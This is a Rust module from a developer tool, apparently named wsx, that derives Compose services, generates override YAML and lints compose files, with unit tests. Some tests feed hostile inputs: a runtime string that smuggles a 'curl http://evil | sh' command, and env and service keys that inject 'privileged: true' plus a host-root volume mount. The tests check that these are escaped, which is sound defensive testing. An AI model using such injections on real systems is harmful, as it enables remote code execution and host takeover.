//! Auto-derive a repo's `services` from its compose file.

use anyhow::{Context, Result};
use serde::Deserialize;
use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};
use std::process::Command;

use crate::caddy::WSX_NET;
use crate::config::{HttpDecl, ServiceConfig};
use crate::remote::{self, Site};

/// Used only to infer `kind` when unset; `compose config` does the real discovery.
const COMPOSE_FILES: &[&str] =
    &["compose.yaml", "compose.yml", "docker-compose.yaml", "docker-compose.yml"];

pub fn has_compose_file(dir: &Path) -> bool {
    COMPOSE_FILES.iter().any(|f| dir.join(f).is_file())
}

/// Base files must lead `COMPOSE_FILE` because setting it disables compose's own auto-discovery; the sibling override is family-matched since compose only merges the matching family.
pub fn base_files(worktree: &Path) -> Vec<PathBuf> {
    let mut files = Vec::new();
    let Some(base) = COMPOSE_FILES.iter().find(|f| worktree.join(f).is_file()) else {
        return files;
    };
    files.push(worktree.join(base));
    let family = if base.starts_with("docker-compose") { "docker-compose" } else { "compose" };
    for ext in ["yaml", "yml"] {
        let sibling = format!("{family}.override.{ext}");
        if worktree.join(&sibling).is_file() {
            files.push(worktree.join(sibling));
            break;
        }
    }
    files
}

/// Compose rejects `COMPOSE_PROJECT_NAME` outside `[a-z0-9][a-z0-9_-]*`, but `sanitize_branch` only strips slashes — so uppercase or dotted branches would otherwise break `up` and `down`.
pub fn project_name(branch_sanitized: &str, repo: &str) -> String {
    let mut s: String = format!("{branch_sanitized}-{repo}")
        .chars()
        .map(|c| match c {
            'a'..='z' | '0'..='9' | '_' | '-' => c,
            'A'..='Z' => c.to_ascii_lowercase(),
            _ => '-',
        })
        .collect();
    let start = s.find(|c: char| c.is_ascii_alphanumeric()).unwrap_or(s.len());
    s.drain(..start);
    if s.is_empty() { "wsx".to_string() } else { s }
}

/// Returns `true` when a file was written (so the caller adds it to `COMPOSE_FILE`).
pub fn write_override(
    site: &Site,
    path: &str,
    services: &BTreeMap<String, ServiceConfig>,
    all_services: &std::collections::BTreeSet<String>,
    port_map: &BTreeMap<String, u16>,
    env: &[(String, String)],
    join_ws_net: bool,
) -> Result<bool> {
    match render_override(services, all_services, port_map, env, join_ws_net) {
        Some(content) => {
            site.write_file(path, &content)?;
            Ok(true)
        }
        None => {
            // Drop a stale override from a prior `up` so a later read-only phase can't reference it.
            site.remove_file(path);
            Ok(false)
        }
    }
}

enum PortsDirective {
    /// `ports: !reset []` — drop the host publish entirely (Caddy routes it).
    Reset,
    /// `ports: !override [...]` — replace the whole list with `host:internal` reissues.
    Override(Vec<(u16, u16)>),
}

#[derive(Default)]
struct ServicePlan {
    is_http: bool,
    reissue: Vec<(u16, u16)>,
}

/// When `join_ws_net` is true (6.2b routing flip) HTTP services join `wsx-net` and drop their host publish so they're reachable only through Caddy; false (no `domain`/remote) is the standalone form where HTTP services keep their publish since nothing else would route them.
fn render_override(
    services: &BTreeMap<String, ServiceConfig>,
    all_services: &std::collections::BTreeSet<String>,
    port_map: &BTreeMap<String, u16>,
    env: &[(String, String)],
    join_ws_net: bool,
) -> Option<String> {
    // A `ports:` directive replaces the whole list, so multi-port derived keys must fold back onto one service block.
    let mut plans: BTreeMap<String, ServicePlan> = BTreeMap::new();
    for (key, svc) in services {
        let plan = plans.entry(compose_service(key, svc.port).to_string()).or_default();
        if svc.is_http() {
            plan.is_http = true;
        } else if let Some(&host) = port_map.get(key) {
            plan.reissue.push((host, svc.port));
        }
    }

    let mut ports: BTreeMap<String, PortsDirective> = BTreeMap::new();
    let mut join: BTreeSet<String> = BTreeSet::new();
    for (name, plan) in &plans {
        if plan.is_http && join_ws_net {
            join.insert(name.clone());
            let directive = if plan.reissue.is_empty() {
                PortsDirective::Reset
            } else {
                PortsDirective::Override(plan.reissue.clone())
            };
            ports.insert(name.clone(), directive);
        } else if plan.is_http {
            // Standalone form: leave HTTP services publishing their host ports since nothing routes them yet.
        } else if !plan.reissue.is_empty() {
            ports.insert(name.clone(), PortsDirective::Override(plan.reissue.clone()));
        }
    }

    if ports.is_empty() && env.is_empty() {
        return None;
    }

    // env must reach every compose service, not just those in `plans` — the container the app runs in is often portless (php-fpm behind nginx).
    let mut names: BTreeSet<String> = ports.keys().cloned().collect();
    if !env.is_empty() {
        names.extend(plans.keys().cloned());
        names.extend(all_services.iter().cloned());
    }

    let mut out = String::from("# Generated by wsx — do not edit. Regenerated on `wsx up`.\nservices:\n");
    for name in &names {
        out.push_str(&format!("  {}:\n", yaml_key(name)));
        match ports.get(name) {
            Some(PortsDirective::Reset) => out.push_str("    ports: !reset []\n"),
            Some(PortsDirective::Override(list)) => {
                out.push_str("    ports: !override\n");
                for (host, internal) in list {
                    out.push_str(&format!("      - \"{host}:{internal}\"\n"));
                }
            }
            None => {}
        }
        if join.contains(name) {
            out.push_str(&format!("    networks:\n      - default\n      - {WSX_NET}\n"));
        }
        if !env.is_empty() {
            out.push_str("    environment:\n");
            for (k, v) in env {
                out.push_str(&format!(
                    "      {}: {}\n",
                    yaml_key(k),
                    yaml_dquote(&compose_escape(v))
                ));
            }
        }
    }
    if !join.is_empty() {
        out.push_str(&format!("networks:\n  {WSX_NET}:\n    external: true\n"));
    }
    Some(out)
}

/// A service literally named `<x>_<port>` publishing that port collides here — the same accepted ambiguity `derive` already carries.
pub(crate) fn compose_service(key: &str, internal_port: u16) -> &str {
    key.strip_suffix(&format!("_{internal_port}")).unwrap_or(key)
}

/// Compose runs its own `$` interpolation after YAML parsing; a residual `$` (unresolved cross-repo token or literal) must escape to `$$` or `up` aborts with an interpolation error.
fn compose_escape(v: &str) -> String {
    v.replace('$', "$$")
}

/// Both key sinks (declared env names, compose service names) are `.wsx.json`-controlled, and a raw newline in one closes `environment:` and dedents back to service level — enough to inject `privileged: true`/`/:/host` into the generated override.
fn yaml_key(k: &str) -> String {
    let mut chars = k.chars();
    let plain = chars.next().is_some_and(|c| c.is_ascii_alphanumeric() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'));
    if plain { k.to_string() } else { yaml_dquote(k) }
}

/// A declared value could contain a newline/tab that would otherwise break the single-line scalar. `yaml_key` funnels hostile keys through here too, so U+0085/2028/2029 must also escape — YAML 1.1 treats them as line breaks.
fn yaml_dquote(v: &str) -> String {
    let mut out = String::with_capacity(v.len() + 2);
    out.push('"');
    for c in v.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if c.is_control() || matches!(c, '\u{2028}' | '\u{2029}') => {
                if (c as u32) < 0x100 {
                    out.push_str(&format!("\\x{:02x}", c as u32));
                } else {
                    out.push_str(&format!("\\u{:04x}", c as u32));
                }
            }
            _ => out.push(c),
        }
    }
    out.push('"');
    out
}

/// `worktree` is the path at the site (local worktree, or server-side synced dir).
pub fn derive(site: &Site, runtime: &str, worktree: &str) -> Result<Derived> {
    let json = compose_config_json(site, runtime, worktree, false)?;
    Ok(Derived { services: parse(&json)?, names: service_names(&json)? })
}

/// `names` carries every compose service (including portless ones) so declared `env` can reach them; `services` only holds those `derive_service` gave a `ServiceConfig`.
pub struct Derived {
    pub services: BTreeMap<String, ServiceConfig>,
    pub names: std::collections::BTreeSet<String>,
}

fn service_names(json: &str) -> Result<std::collections::BTreeSet<String>> {
    let cfg: ComposeConfig = serde_json::from_str(json).context("parse compose config JSON")?;
    Ok(cfg.services.keys().cloned().collect())
}

/// `clean_env` strips ws's injected `COMPOSE_*` locally so the lint sees the committed project; remotely the server shell never has them.
fn compose_config_json(site: &Site, runtime: &str, worktree: &str, clean_env: bool) -> Result<String> {
    let out = match site {
        Site::Local => {
            let mut cmd = Command::new(runtime);
            cmd.args(["compose", "config", "--format", "json"]).current_dir(worktree);
            if clean_env {
                cmd.env_remove("COMPOSE_PROJECT_NAME").env_remove("COMPOSE_FILE");
            }
            cmd.output()
                .with_context(|| format!("spawn `{runtime} compose config`"))?
        }
        Site::Remote { .. } => site
            .shell(&remote_compose_script(worktree, runtime))
            .output()
            .with_context(|| format!("ssh `{runtime} compose config`"))?,
    };
    if !out.status.success() {
        anyhow::bail!(
            "`{runtime} compose config` failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(String::from_utf8_lossy(&out.stdout).into_owned())
}

/// `runtime` comes from a checked-in `.wsx.json`, so a hostile value must be shell-quoted here to match the local `Command::new(runtime)` no-shell contract.
fn remote_compose_script(worktree: &str, runtime: &str) -> String {
    format!(
        "cd {} && {} compose config --format json",
        remote::shell_quote(worktree),
        remote::shell_quote(runtime)
    )
}

#[derive(Deserialize)]
struct ComposeConfig {
    #[serde(default)]
    services: BTreeMap<String, ComposeService>,
}

#[derive(Deserialize)]
struct ComposeService {
    #[serde(default)]
    ports: Vec<ComposePort>,
}

#[derive(Deserialize)]
struct ComposePort {
    target: u16,
    #[serde(default)]
    protocol: Option<String>,
}

fn parse(json: &str) -> Result<BTreeMap<String, ServiceConfig>> {
    let cfg: ComposeConfig = serde_json::from_str(json).context("parse compose config JSON")?;
    let mut out = BTreeMap::new();
    for (name, svc) in &cfg.services {
        derive_service(name, svc, &mut out);
    }
    Ok(out)
}

fn derive_service(name: &str, svc: &ComposeService, out: &mut BTreeMap<String, ServiceConfig>) {
    let ports: std::collections::BTreeSet<u16> = svc
        .ports
        .iter()
        .filter(|p| p.protocol.as_deref().unwrap_or("tcp") == "tcp")
        .map(|p| p.target)
        .collect();
    // HTTP is deliberately narrow (80/443 only) — widen via `.wsx.json`, not here; mis-classifying raw TCP as HTTP would have Caddy try to HTTP-proxy a non-HTTP protocol.
    let (http, tcp): (Vec<u16>, Vec<u16>) =
        ports.into_iter().partition(|p| *p == 80 || *p == 443);

    if !http.is_empty() {
        let dial = if http.contains(&80) { 80 } else { 443 };
        out.insert(
            name.to_string(),
            ServiceConfig { http: Some(HttpDecl::Subdomain(name.to_string())), port: dial, shared: false, wildcard: false },
        );
    }
    // Suffix with the port whenever the service yields more than one entry, so keys (and `WSX_PORT_*` names) stay distinct.
    let single = http.is_empty() && tcp.len() == 1;
    for p in tcp {
        let key = if single { name.to_string() } else { format!("{name}_{p}") };
        out.insert(key, ServiceConfig { http: None, port: p, shared: false, wildcard: false });
    }
}

// The linter only flags `container_name:` and `external: true` volumes — compose emits project-resolved names for the project and every named volume, so those can't be told from a committed pin without false-positiving every clean project.

/// Map values are `Option` so a stray `null` entry can't fail the whole parse (the lint is best-effort).
#[derive(Deserialize)]
struct LintDoc {
    #[serde(default)]
    services: BTreeMap<String, Option<LintService>>,
    #[serde(default)]
    volumes: BTreeMap<String, Option<LintVolume>>,
}

#[derive(Deserialize)]
struct LintService {
    #[serde(default)]
    container_name: Option<String>,
}

#[derive(Deserialize)]
struct LintVolume {
    /// Tolerate the older `{name: …}` object form alongside the normalized bool.
    #[serde(default)]
    external: Option<serde_json::Value>,
}

/// Empty when the project is clean, has no compose file, or the runtime is unavailable.
pub fn lint(runtime: &str, worktree: &Path) -> Vec<String> {
    if !has_compose_file(worktree) {
        return Vec::new();
    }
    // Static check over the synced committed files, so always local — even for a remote stack.
    let Ok(json) = compose_config_json(&Site::Local, runtime, &worktree.to_string_lossy(), true)
    else {
        return Vec::new();
    };
    match serde_json::from_str::<LintDoc>(&json) {
        Ok(doc) => lint_findings(&doc),
        Err(_) => Vec::new(),
    }
}

fn lint_findings(doc: &LintDoc) -> Vec<String> {
    let mut out = Vec::new();

    // Compose emits `container_name` only when committed, so this is unambiguous.
    for (svc, s) in &doc.services {
        if let Some(cn) = s.as_ref().and_then(|s| s.container_name.as_deref()) {
            out.push(format!(
                "service `{svc}` sets `container_name: {cn}` — breaks per-worktree \
                 namespacing; parallel worktrees collide on the name (remove it)"
            ));
        }
    }

    // Compose emits `external` only when committed.
    for (vol, v) in &doc.volumes {
        if v.as_ref().is_some_and(|v| is_truthy(v.external.as_ref())) {
            out.push(format!(
                "volume `{vol}` is `external` — shared across worktrees, so one \
                 branch's writes/migrations corrupt another's (can't auto-fix)"
            ));
        }
    }

    out
}

fn is_truthy(v: Option<&serde_json::Value>) -> bool {
    match v {
        Some(serde_json::Value::Bool(b)) => *b,
        Some(serde_json::Value::Object(o)) => !o.is_empty(),
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE: &str = r#"{
      "name": "proj",
      "services": {
        "web":     { "ports": [ {"target": 443, "protocol": "tcp"}, {"target": 80, "protocol": "tcp"} ] },
        "app":     { "expose": ["9000"] },
        "db":      { "ports": [ {"target": 3306, "protocol": "tcp"} ] },
        "mailpit": { "ports": [ {"target": 1025, "protocol": "tcp"}, {"target": 8025, "protocol": "tcp"} ] },
        "redis":   { "ports": [ {"target": 6379, "published": "6379", "protocol": "tcp"} ] }
      }
    }"#;

    #[test]
    fn derives_http_tcp_and_multiport() {
        let s = parse(SAMPLE).unwrap();

        let web = &s["web"];
        assert!(matches!(web.http, Some(HttpDecl::Subdomain(ref d)) if d == "web"));
        assert_eq!(web.port, 80);

        assert!(s["db"].http.is_none() && s["db"].port == 3306);
        assert!(s["redis"].http.is_none() && s["redis"].port == 6379);

        assert_eq!(s["mailpit_1025"].port, 1025);
        assert_eq!(s["mailpit_8025"].port, 8025);
        assert!(s["mailpit_1025"].http.is_none());
        assert!(!s.contains_key("mailpit"), "multi-port must not keep the bare name");

        assert!(!s.contains_key("app"));
    }

    #[test]
    fn remote_compose_script_quotes_a_hostile_runtime() {
        let s = remote_compose_script("/srv/ws/feat/api", "podman; curl http://evil | sh #");
        assert!(s.contains("'podman; curl http://evil | sh #'"), "runtime not quoted: {s}");
        assert!(s.starts_with("cd /srv/ws/feat/api && "), "{s}");
        assert_eq!(
            remote_compose_script("/w", "podman"),
            "cd /w && podman compose config --format json"
        );
    }

    #[test]
    fn service_with_only_443_routes_http() {
        let json = r#"{"services":{"web":{"ports":[{"target":443,"protocol":"tcp"}]}}}"#;
        let s = parse(json).unwrap();
        assert!(matches!(s["web"].http, Some(HttpDecl::Subdomain(_))));
        assert_eq!(s["web"].port, 443);
    }

    #[test]
    fn http_service_with_extra_tcp_port_splits() {
        let json = r#"{"services":{"web":{"ports":[
            {"target":80,"protocol":"tcp"},{"target":9000,"protocol":"tcp"}]}}}"#;
        let s = parse(json).unwrap();
        assert_eq!(s["web"].port, 80);
        assert!(matches!(s["web"].http, Some(HttpDecl::Subdomain(_))));
        assert_eq!(s["web_9000"].port, 9000);
        assert!(s["web_9000"].http.is_none());
    }

    #[test]
    fn udp_ports_are_ignored() {
        let json = r#"{"services":{"dns":{"ports":[{"target":53,"protocol":"udp"}]}}}"#;
        assert!(parse(json).unwrap().is_empty());
    }

    #[test]
    fn empty_services_parse_to_empty() {
        assert!(parse(r#"{"name":"x"}"#).unwrap().is_empty());
    }

    fn svc(http: Option<HttpDecl>, port: u16) -> ServiceConfig {
        ServiceConfig { http, port, shared: false, wildcard: false }
    }

    fn map(entries: &[(&str, ServiceConfig)]) -> BTreeMap<String, ServiceConfig> {
        entries.iter().map(|(n, s)| ((*n).into(), s.clone())).collect()
    }

    fn names(services: &BTreeMap<String, ServiceConfig>) -> BTreeSet<String> {
        services.iter().map(|(k, s)| compose_service(k, s.port).to_string()).collect()
    }

    #[test]
    fn declared_env_reaches_a_portless_service() {
        // A portless service (php-fpm behind nginx) never enters the derived `services` map, but declared env must still reach it or `artisan` reads the stale `.env`.
        let services = map(&[("web", svc(Some(HttpDecl::Subdomain("web".into())), 80))]);
        let all: BTreeSet<String> =
            ["app", "web", "db"].iter().map(|s| s.to_string()).collect();
        let env = [("SSO".to_string(), "host:20001".to_string())];
        let out = render_override(&services, &all, &BTreeMap::new(), &env, true)
            .expect("some override");

        assert!(out.contains("  app:\n    environment:\n      SSO:"), "portless svc missing env: {out}");
        assert!(out.contains("  db:\n    environment:\n      SSO:"), "db missing env: {out}");
        assert!(out.contains("SSO: \"host:20001\""), "{out}");
    }

    #[test]
    fn override_reissues_raw_tcp_ports_and_leaves_http_alone() {
        let services = map(&[
            ("web", svc(Some(HttpDecl::Subdomain("web".into())), 80)),
            ("db", svc(None, 3306)),
        ]);
        let ports = [("db".to_string(), 20001u16)].into_iter().collect();
        let out = render_override(&services, &names(&services), &ports, &[], false).expect("some override");

        assert!(out.contains("  db:\n    ports: !override\n      - \"20001:3306\""), "{out}");
        assert!(!out.contains("web:"), "HTTP service must not appear in the override: {out}");
    }

    #[test]
    fn override_groups_multiport_service_under_one_entry() {
        let services = map(&[
            ("mailpit_1025", svc(None, 1025)),
            ("mailpit_8025", svc(None, 8025)),
        ]);
        let ports =
            [("mailpit_1025".to_string(), 20002u16), ("mailpit_8025".to_string(), 20003u16)]
                .into_iter()
                .collect();
        let out = render_override(&services, &names(&services), &ports, &[], false).expect("some override");

        assert_eq!(out.matches("mailpit:").count(), 1, "one grouped entry: {out}");
        assert!(out.contains("      - \"20002:1025\""), "{out}");
        assert!(out.contains("      - \"20003:8025\""), "{out}");
    }

    #[test]
    fn override_materializes_declared_env_on_every_service() {
        let services = map(&[
            ("web", svc(Some(HttpDecl::Subdomain("web".into())), 80)),
            ("db", svc(None, 3306)),
        ]);
        let ports = [("db".to_string(), 20001u16)].into_iter().collect();
        let env = [("APP_URL".to_string(), "https://feat-x.web.myapp.test".to_string())];
        let out = render_override(&services, &names(&services), &ports, &env, false).expect("some override");

        assert_eq!(out.matches("APP_URL:").count(), 2, "{out}");
        assert!(out.contains("APP_URL: \"https://feat-x.web.myapp.test\""), "{out}");
    }

    #[test]
    fn override_escapes_dollars_so_compose_wont_interpolate_an_unresolved_token() {
        // An unresolved cross-repo token written raw would trigger compose's own interpolation and abort `up`.
        let services = map(&[("web", svc(Some(HttpDecl::Subdomain("web".into())), 80))]);
        let env = [("SSO".to_string(), "host:${WSX_PORT_app.web}/login".to_string())];
        let out = render_override(&services, &names(&services), &BTreeMap::new(), &env, false)
            .expect("some override");
        assert!(out.contains(r#"SSO: "host:$${WSX_PORT_app.web}/login""#), "{out}");
        assert!(!out.contains(r#"SSO: "host:${WSX_PORT_app.web}"#), "raw token must not survive: {out}");
    }

    #[test]
    fn override_quotes_a_hostile_env_key_so_it_cant_inject_service_directives() {
        // `.wsx.json` arrives with a cloned repo, and a JSON key can carry
        // newlines. Unquoted, this key closes the `environment:` map and dedents
        // back to service level, handing every service in the stack
        // `privileged: true` plus the host root — none of which the repo's
        // committed compose file grants. Quoted, it's one inert scalar.
        let services = map(&[("web", svc(Some(HttpDecl::Subdomain("web".into())), 80))]);
        let hostile =
            "X: \"1\"\n    privileged: true\n    volumes:\n      - \"/:/host\"\n    labels";
        let env = [(hostile.to_string(), "pwn".to_string())];
        let out = render_override(&services, &names(&services), &BTreeMap::new(), &env, false)
            .expect("some override");

        assert!(
            out.contains(
                r#"      "X: \"1\"\n    privileged: true\n    volumes:\n      - \"/:/host\"\n    labels": "pwn""#
            ),
            "hostile key must render as one escaped scalar:\n{out}"
        );
        assert!(!out.contains("\n    privileged: true"), "directive injected:\n{out}");
        assert!(!out.contains("\n    volumes:"), "directive injected:\n{out}");
        // Comment, `services:`, `  web:`, `    environment:`, the one env line.
        assert_eq!(out.lines().count(), 5, "hostile key added lines:\n{out}");
    }

    #[test]
    fn override_quotes_a_hostile_service_name() {
        // Same shape one level up: a `.wsx.json` `services` key becomes a compose
        // service name and is emitted as a YAML key too, so a newline in it would
        // inject a whole extra service block.
        let hostile = "web:\n    privileged: true\n  evil";
        let services = map(&[(hostile, svc(None, 3306))]);
        let ports = [(hostile.to_string(), 20001u16)].into_iter().collect();
        let out = render_override(&services, &names(&services), &ports, &[], false)
            .expect("some override");

        assert!(
            out.contains(r#"  "web:\n    privileged: true\n  evil":"#),
            "hostile service name must be quoted:\n{out}"
        );
        assert!(!out.contains("\n    privileged: true"), "directive injected:\n{out}");
        // Comment, `services:`, the one service key, `ports: !override`, one port.
        assert_eq!(out.lines().count(), 5, "hostile name added lines:\n{out}");
    }

    #[test]
    fn ordinary_service_names_and_env_keys_stay_bare_keys() {
        // The key guard must be invisible to real config: compose service names
        // (which legally carry `-` and `.`) and env var names render exactly as
        // they did before it existed.
        let services = map(&[("api-gateway", svc(None, 8080)), ("mail.relay", svc(None, 1025))]);
        let ports = [("api-gateway".to_string(), 20010u16), ("mail.relay".to_string(), 20011u16)]
            .into_iter()
            .collect();
        let env = [
            ("APP_URL".to_string(), "https://feat-x.web.myapp.test".to_string()),
            ("DB_PORT_2".to_string(), "3306".to_string()),
            ("_LEADING_UNDERSCORE".to_string(), "ok".to_string()),
        ];
        let out = render_override(&services, &names(&services), &ports, &env, false)
            .expect("some override");

        assert!(out.contains("  api-gateway:\n    ports: !override\n"), "{out}");
        assert!(out.contains("  mail.relay:\n    ports: !override\n"), "{out}");
        assert!(out.contains("      APP_URL: \"https://feat-x.web.myapp.test\"\n"), "{out}");
        assert!(out.contains("      DB_PORT_2: \"3306\"\n"), "{out}");
        assert!(out.contains("      _LEADING_UNDERSCORE: \"ok\"\n"), "{out}");
    }

    #[test]
    fn yaml_dquote_escapes_exotic_line_breaks() {
        // U+0085 / U+2028 are line breaks to a YAML 1.1 parser; raw, they'd end
        // the scalar's line from inside the quotes.
        assert_eq!(yaml_dquote("a\u{85}b\u{2028}c\u{b}d"), r#""a\x85b\u2028c\x0bd""#);
    }

    #[test]
    fn override_is_none_when_nothing_to_reissue() {
        let services = map(&[("web", svc(Some(HttpDecl::Subdomain("web".into())), 80))]);
        assert!(render_override(&services, &names(&services), &BTreeMap::new(), &[], false).is_none());
    }

    #[test]
    fn join_ws_net_resets_http_publish_and_declares_external_network() {
        let services = map(&[
            ("web", svc(Some(HttpDecl::Subdomain("web".into())), 80)),
            ("db", svc(None, 3306)),
        ]);
        let ports = [("db".to_string(), 20001u16)].into_iter().collect();

        let off = render_override(&services, &names(&services), &ports, &[], false).unwrap();
        assert!(!off.contains("wsx-net"), "join off must not touch wsx-net:\n{off}");
        assert!(!off.contains("web:"), "HTTP web untouched when routing off:\n{off}");

        let on = render_override(&services, &names(&services), &ports, &[], true).unwrap();
        assert!(
            on.contains("  web:\n    ports: !reset []\n    networks:\n      - default\n      - wsx-net\n"),
            "web must reset its publish and join wsx-net:\n{on}"
        );
        assert!(on.contains("  db:\n    ports: !override\n"), "db still reissued:\n{on}");
        assert!(on.contains("networks:\n  wsx-net:\n    external: true\n"), "external net decl:\n{on}");
    }

    #[test]
    fn mixed_http_and_raw_service_keeps_only_the_raw_port_when_routing() {
        let services = map(&[
            ("web", svc(Some(HttpDecl::Subdomain("web".into())), 80)),
            ("web_9000", svc(None, 9000)),
        ]);
        let ports = [("web_9000".to_string(), 20005u16)].into_iter().collect();

        assert!(render_override(&services, &names(&services), &ports, &[], false).is_none());

        let on = render_override(&services, &names(&services), &ports, &[], true).unwrap();
        assert!(
            on.contains("  web:\n    ports: !override\n      - \"20005:9000\"\n    networks:"),
            "mixed service keeps only its raw port + joins wsx-net:\n{on}"
        );
        assert!(!on.contains("!reset"), "a mixed service uses !override, not !reset:\n{on}");
    }

    #[test]
    fn compose_service_keeps_a_legit_underscored_single_port_name() {
        assert_eq!(compose_service("my_db", 3306), "my_db");
        assert_eq!(compose_service("mailpit_8025", 8025), "mailpit");
    }

    #[test]
    fn project_name_is_compose_legal() {
        assert_eq!(project_name("feat-foo", "api"), "feat-foo-api");
        assert_eq!(project_name("Feat-JIRA-1.2", "api"), "feat-jira-1-2-api");
        assert_eq!(project_name("-x", "api"), "x-api");
    }

    #[test]
    fn base_files_ignores_a_mismatched_family_override() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("compose.yaml"), "services: {}\n").unwrap();
        std::fs::write(dir.path().join("docker-compose.override.yml"), "services: {}\n").unwrap();
        let files = base_files(dir.path());
        assert_eq!(files.len(), 1, "only the primary, no cross-family override: {files:?}");
        assert!(files[0].ends_with("compose.yaml"));
    }

    fn lint_json(json: &str) -> Vec<String> {
        let doc: LintDoc = serde_json::from_str(json).unwrap();
        lint_findings(&doc)
    }

    #[test]
    fn lint_flags_container_name_and_external_volume() {
        let json = r#"{
            "name": "myapp",
            "services": { "db": { "container_name": "myapp_db" }, "web": {} },
            "volumes": { "data": { "external": true }, "cache": { "name": "shared_cache" } }
        }"#;
        let findings = lint_json(json);
        // The pinned project `name` and resolved volume `name` are emitted for every clean project and must not be flagged.
        assert_eq!(findings.len(), 2, "only the two reliable opt-outs: {findings:?}");
        assert!(findings.iter().any(|f| f.contains("container_name: myapp_db")), "{findings:?}");
        assert!(findings.iter().any(|f| f.contains("volume `data` is `external`")), "{findings:?}");
    }

    #[test]
    fn lint_is_quiet_on_a_clean_project_with_resolved_names() {
        // A project `name` and project-prefixed volume `name` are always emitted, even for a plain `data: {}` — neither is a committed pin.
        let json = r#"{
            "name": "api",
            "services": { "web": { "ports": [ {"target": 80} ] }, "db": {} },
            "volumes": { "data": { "name": "api_data" } }
        }"#;
        assert!(lint_json(json).is_empty(), "resolved names must not warn: {:?}", lint_json(json));
    }

    #[test]
    fn lint_survives_a_null_map_value() {
        // A stray null must not fail the whole parse and silently drop real findings.
        let json = r#"{"services":{"db":null,"x":{"container_name":"fixed"}},"volumes":{"v":null}}"#;
        let findings = lint_json(json);
        assert_eq!(findings.len(), 1, "null values skipped, real finding kept: {findings:?}");
        assert!(findings[0].contains("container_name: fixed"));
    }

    #[test]
    fn base_files_lists_primary_and_sibling_override() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("docker-compose.yml"), "services: {}\n").unwrap();
        std::fs::write(dir.path().join("docker-compose.override.yml"), "services: {}\n").unwrap();
        let files = base_files(dir.path());
        assert_eq!(files.len(), 2);
        assert!(files[0].ends_with("docker-compose.yml"));
        assert!(files[1].ends_with("docker-compose.override.yml"));

        assert!(base_files(tempfile::tempdir().unwrap().path()).is_empty());
    }
}
